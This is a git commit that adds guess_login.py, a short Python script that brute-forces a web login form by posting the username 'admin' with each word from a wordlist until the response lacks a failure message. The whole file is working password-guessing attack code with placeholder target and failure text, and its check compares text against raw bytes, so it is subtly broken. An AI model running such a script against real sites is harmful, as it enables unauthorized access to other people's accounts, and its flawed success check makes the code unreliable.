fd294624abc9458dd2d0e84b846efc265659e7d6
Kelvin Forteta <kelvin.forteta@gmail.com>
2023-07-23 01:11:09 -0400

    created crawler and spider

---
+++ guess_login.py
@@ -0,0 +1,17 @@
+#!/usr/bin/env python
+
+import requests
+
+target_url = ""
+data_dic = {"username": "admin", "password": "", "Login": "submit"}
+
+with open("subdomains.list", "r") as wordlist_file:
+    for line in wordlist_file:
+        word = line.strip()
+        data_dic["password"] = word
+        response = requests.post(target_url, data=data_dic)
+
+        if "[any_word_that is on failed page]" not in response.content:
+            print(f"[+] Got the password --> {word}")
+            exit()
+print("[+] Reached end of line.")
